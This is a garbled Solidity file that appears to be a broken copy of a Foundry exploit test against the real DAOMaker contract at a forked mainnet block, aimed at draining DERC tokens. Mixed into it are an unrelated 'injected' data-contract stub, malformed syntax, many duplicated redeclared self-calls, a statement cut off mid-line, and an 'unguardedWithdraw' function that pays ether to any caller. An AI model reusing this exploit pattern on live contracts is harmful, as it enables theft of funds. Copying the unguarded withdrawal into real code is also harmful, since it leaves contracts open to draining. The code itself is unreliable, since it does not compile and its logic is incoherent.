
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.13;

;
;
interface DAOMaker {
    function init(uint256 , uint256[] calldata, uint256[] calldata, address) external;
    function emergencyExit(address) external};
contract ContractTest is Test {
    DAOMaker daomaker =  DAOMaker(0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940);
    IERC20 DERC = IERC20(0x9fa69536d1cda4A04cFB50688294de75B505a9aE);
    function setUp() public {
        vm.createSelectFork("mainnet", 13155320)};
   function testExploit() public {
    uint256[] memory releasePeriods = new uint256[](1);
    releasePeriods[0]= 5702400;
    uint256[] memory releasePercents = new uint256[](1);
    releasePercents[0]= 10000;
    emit log_named_decimal_uint("Before exploiting, Attacker DERC balance",DERC.balanceOf(address(this)), 18);
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) = address(this).call(abi.encodeWithSignature("setUp()"));
    (bool success,) =
function unguardedWithdraw() public {
    (bool sent, ) = msg.sender.call{value: 1 ether}("");
    require(sent)}